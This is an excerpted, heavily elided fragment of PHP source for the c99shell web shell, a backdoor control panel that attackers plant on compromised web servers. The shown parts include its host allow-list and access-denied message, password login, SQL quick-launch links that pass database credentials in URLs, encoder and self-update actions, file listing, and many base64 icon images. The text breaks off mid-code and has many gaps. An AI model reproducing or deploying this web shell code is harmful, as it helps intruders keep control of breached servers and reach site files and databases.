...
if ($surl_autofill_include and !$_REQUEST['c99sh_surl']) {
    ...
    foreach (explode('&', getenv('QUERY_STRING')) as $v) {
        ...
        foreach (['http://', 'https://', 'ssl://', 'ftp://', '\\'] as $needle) {
...
$host_allow = ['*']; //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")
...
put here your html. */
$donated_act = ['']; //array ("act1","act2,"...), if $act is in this array, display $donated_html.
...
$safemode_diskettes = ['a']; // This variable for disabling diskett-errors.
...
if (!preg_match($s, getenv('REMOTE_ADDR')) and !preg_match($s, gethostbyaddr(getenv('REMOTE_ADDR')))) {
    exit('<a href="http://ccteam.ru/releases/cc99shell">c99shell</a>: Access Denied - your host (' . getenv('REMOTE_ADDR') . ') not allow');
}
if (!empty($login)) {
    if (empty($md5_pass)) {
        $md5_pass = md5($pass);
...
if ($sql_server) {
        ...
        if (!$sql_sock) {
            ...
            $sqlquicklaunch = [];
            $sqlquicklaunch[] = ['Index', $surl . 'act=sql&sql_login=' . htmlspecialchars($sql_login) . '&sql_passwd=' . htmlspecialchars($sql_passwd) . '&sql_server=' . htmlspecialchars($sql_server) . '&sql_port=' . htmlspecialchars($sql_port) . '&'];
            $sqlquicklaunch[] = ['Query', $sql_surl . 'sql_act=query&sql_tbl=' . urlencode($sql_tbl)];
            $sqlquicklaunch[] = ['Server-status', $surl . 'act=sql&sql_login=' . htmlspecialchars($sql_login) . '&sql_passwd=' . htmlspecialchars($sql_passwd) . '&sql_server=' . htmlspecialchars($sql_server) . '&sql_port=' . htmlspecialchars($sql_port) . '&sql_act=serverstatus'];
            $sqlquicklaunch[] = ['Server variables', $surl . 'act=sql&sql_login=' . htmlspecialchars($sql_login) . '&sql_passwd=' . htmlspecialchars($sql_passwd) . '&sql_server=' . htmlspecialchars($sql_server) . '&sql_port=' . htmlspecialchars($sql_port) . '&sql_act=servervars'];
            $sqlquicklaunch[] = ['Processes', $surl . 'act=sql&sql_login=' . htmlspecialchars($sql_login) . '&sql_passwd=' . htmlspecialchars($sql_passwd) . '&sql_server=' . htmlspecialchars($sql_server) . '&sql_port=' . htmlspecialchars($sql_port) . '&sql_act=processes'];
            $sqlquicklaunch[] = ['Logout', $surl . 'act=sql'];
...
epair&ft=download"><u><b>Download</b></u></a>, and use lcp.crack+ ©.</font></b><br>';
    ...
    if ('encoder' == $act) {
        ...
        foreach (['md5', 'crypt', 'sha1', 'crc32'] as $v) {
...
', $debase64);
    ...
    if ('update' == $act) {
        $ret = c99sh_getupdate((bool) $confirmupdate);
        echo '<b>' . $ret . '</b>';
    ...
    if ('ls' == $act) {
        ...
        if (0 == count($list)) {
            ...
            if ('f' == $vd) {
                ...
                $y = '<a href="' . $surl . 'act=' . $dspact . '&d=' . urlencode($d) . '&sort=' . $k . ('a' == $parsesort[1] ? 'd' : 'a') . '">';
                $y .= '<img src="' . $surl . 'act=img&img=sort_' . ('a' == $sort[1] ? 'asc' : 'desc') . '" height="9" width="14" alt="' . ('a' == $parsesort[1] ? 'Asc.' : 'Desc') . '" border="0"></a>';
                $row[$k] .= $y;
...
', $r));
    ...
    @ob_clean();
    $images = [
'arrow_ltr' => 'R0lGODlhJgAWAIAAAAAAAP///yH5BAUUAAEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQ' .
'SIrUZGZoerKf28KjPNPOaku5RfZ+uQsKh8RiogAAOw==',
'back' => 'R0lGODlhFAAUAKIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8' .
'aLrc/jDKSWWpjVysSNiYJ4CUOBJoqjniILzwuzLtYN/3zBSErf6kBW+gKRiPRghPh+EFK0mOUEqt' .
'Wg0JADs=',
'buffer' => 'R0lGODlhFAAUAKIAAAAAAP////j4+N3d3czMzLKysoaGhv///yH5BAEAAAcALAAAAAAUABQAAANo' .
...
'zMshADs=',
'delete' => 'R0lGODlhFAAUAOZZAPz8/NPFyNgHLs0YOvPz8/b29sacpNXV1fX19cwXOfDw8Kenp/n5+etgeunp' .
...
'forward' => 'R0lGODlhFAAUAPIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8' .
'aLrc/jDK2Qp9xV5WiN5G50FZaRLD6IhE66Lpt3RDbd9CQFSE4P++QW7He7UKPh0IqVw2l0RQSEqt' .
'WqsJADs=',
'home' => 'R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzLKysoaGhmZmZgQEBP///wAAAAAAAAAAAAAAAAAA' .
...
'mode' => 'R0lGODlhHQAUALMAAAAAAP///6CgpN3d3czMzIaGhmZmZl9fX////wAAAAAAAAAAAAAAAAAAAAAA' .
...
'refresh' => 'R0lGODlhEQAUALMAAAAAAP////Hx8erq6uPj493d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAA' .
...
'search' => 'R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP//' .
...
'setup' => 'R0lGODlhFAAUAMQAAAAAAP////j4+OPj493d3czMzMDAwLKyspaWloaGhnd3d2ZmZl9fX01NTUJC' .
...
'sort_asc' => 'R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMa' .
'SLrcPcE9GKUaQlQ5sN5PloFLJ35OoK6q5SYAOw==',
'sort_desc' => 'R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMb' .
...
'up' => 'R0lGODlhFAAUALMAAAAAAP////j4+OPj493d3czMzLKysoaGhk1NTf///wAAAAAAAAAAAAAAAAAA' .
...
'write' => 'R0lGODlhFAAUALMAAAAAAP///93d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAAAAAAAAAAAAAA' .
...
'ext_asp' => 'R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD/' .
'/////ywAAAAAEAAQAAAESvDISasF2N6DMNAS8Bxfl1UiOZYe9aUwgpDTq6qP/IX0Oz7AXU/1eRgI' .
'D6HPhzjSeLYdYabsDCWMZwhg3WWtKK4QrMHohCAS+hABADs=',
'ext_mp3' => 'R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU' .
'aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc' .
'IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=',
'ext_avi' => 'R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///4CAgMDAwP8AAAAAAAAAAAAAAANM' .
'WFrS7iuKQGsYIqpp6QiZ1FFACYijB4RMqjbY01DwWg44gAsrP5QFk24HuOhODJwSU/IhBYTcjxe4' .
'PYXCyg+V2i44XeRmSfYqsGhAAgA7',
'ext_cgi' => 'R0lGODlhEAAQAGYAACH5BAEAAEwALAAAAAAQABAAhgAAAJtqCHd3d7iNGa+HMu7er9GiC6+IOOu9' .
...
'RYtMAgEAOw==',
'ext_cmd' => 'R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgICAAP//AAAAAANI' .
'eLrcJzDKCYe9+AogBvlg+G2dSAQAipID5XJDIM+0zNJFkdL3DBg6HmxWMEAAhVlPBhgYdrYhDQCN' .
'dmrYAMn1onq/YKpjvEgAADs=',
'ext_cpp' => 'R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANC' .
'WLPc9XCASScZ8MlKicobBwRkEIkVYWqT4FICoJ5v7c6s3cqrArwinE/349FiNoFw44rtlqhOL4Ra' .
'Eq7YrLDE7a4SADs=',
'ext_ini' => 'R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///8DAwICAgICAAP//AAAAAAAAAANL' .
'aArB3ioaNkK9MNbHs6lBKIoCoI1oUJ4N4DCqqYBpuM6hq8P3hwoEgU3mawELBEaPFiAUAMgYy3VM' .
'SnEjgPVarHEHgrB43JvszsQEADs=',
'ext_diz' => 'R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAP///15phcfb6NLs/7Pc/+P0/3J+l9bs' .
...
'Ow==',
'ext_doc' => 'R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///8DAwAAA/4CAgAAAAAAAAAAAAANR' .
'WErcrrCQQCslQA2wOwdXkIFWNVBA+nme4AZCuolnRwkwF9QgEOPAFG21A+Z4sQHO94r1eJRTJVmq' .
'MIOrrPSWWZRcza6kaolBCOB0WoxRud0JADs=',
'ext_exe' => 'R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7' .
'WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt' .
'xhIAOw==',
'ext_h' => 'R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANB' .
'WLPc9XCASScZ8MlKCcARRwVkEAKCIBKmNqVrq7wpbMmbbbOnrgI8F+q3w9GOQOMQGZyJOspnMkKo' .
'Wq/NknbbSgAAOw==',
'ext_hpp' => 'R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANF' .
'WLPc9XCASScZ8MlKicobBwRkEAGCIAKEqaFqpbZnmk42/d43yroKmLADlPBis6LwKNAFj7jfaWVR' .
'UqUagnbLdZa+YFcCADs=',
'ext_htaccess' => 'R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6' .
'WEXW/k6RAGsjmFoYgNBbEwjDB25dGZzVCKgsR8LhSnprPQ406pafmkDwUumIvJBoRAAAlEuDEwpJ' .
'AAA7',
'ext_html' => 'R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz' .
'c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P' .
'KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk' .
'Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR' .
'ADs=',
'ext_jpg' => 'R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA' .
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci' .
'Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd' .
'FxEAOw==',
'ext_js' => 'R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH' .
'k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs' .
'a00AjYYBbc/o9HjNniUAADs=',
'ext_lnk' => 'R0lGODlhEAAQAGYAACH5BAEAAFAALAAAAAAQABAAhgAAAABiAGPLMmXMM0y/JlfFLFS6K1rGLWjO' .
...
'ADs=',
'ext_log' => 'R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAMDAwICAgICAAAAAgAAA////AAAA' .
...
'ext_php' => 'R0lGODlhEAAQAAAAACH5BAEAAAEALAAAAAAQABAAgAAAAAAAAAImDA6hy5rW0HGosffsdTpqvFlg' .
't0hkyZ3Q6qloZ7JimomVEb+uXAAAOw==',
'ext_pl' => 'R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo' .
'GLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7',
'ext_swf' => 'R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/O' .
...
'u4tLAgEAOw==',
'ext_txt' => 'R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ' .
'SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7' .
'UpPWG3Ig6Hq/XmRjuZwkAAA7',
'ext_wri' => 'R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA' .
...
'IQA7',
    ...
    $imgequals = [
  'ext_tar' => ['ext_tar', 'ext_r00', 'ext_ace', 'ext_arj', 'ext_bz', 'ext_bz2', 'ext_tbz', 'ext_tbz2', 'ext_tgz', 'ext_uu', 'ext_xxe', 'ext_zip', 'ext_cab', 'ext_gz', 'ext_iso', 'ext_lha', 'ext_lzh', 'ext_pbk', 'ext_rar', 'ext_uuf'],
  'ext_php' => ['ext_php', 'ext_php3', 'ext_php4', 'ext_php5', 'ext_phtml', 'ext_shtml', 'ext_htm'],
  'ext_jpg' => ['ext_jpg', 'ext_gif', 'ext_png', 'ext_jpeg', 'ext_jfif', 'ext_jpe', 'ext_bmp', 'ext_ico', 'ext_tif', 'tiff'],
  'ext_html' => ['ext_html', 'ext_htm'],
  'ext_avi' => ['ext_avi', 'ext_mov', 'ext_mvi', 'ext_mpg', 'ext_mpeg', 'ext_wmv', 'ext_rm'],
  'ext_lnk' => ['ext_lnk', 'ext_url'],
  'ext_ini' => ['ext_ini', 'ext_css', 'ext_inf'],
  'ext_doc' => ['ext_doc', 'ext_dot'],
  'ext_js' => ['ext_js', 'ext_vbs'],
  'ext_cmd' => ['ext_cmd', 'ext_bat', 'ext_pif'],
  'ext_wri' => ['ext_wri', 'ext_rtf'],
  'ext_swf' => ['ext_swf', 'ext_fla'],
  'ext_mp3' => ['ext_mp3', 'ext_au', 'ext_midi', 'ext_mid'],
  'ext_htaccess' => ['ext_htaccess', 'ext_htpasswd', 'ext_ht', 'ext_hta', 'ext_so'],
];
    if (!$getall) {
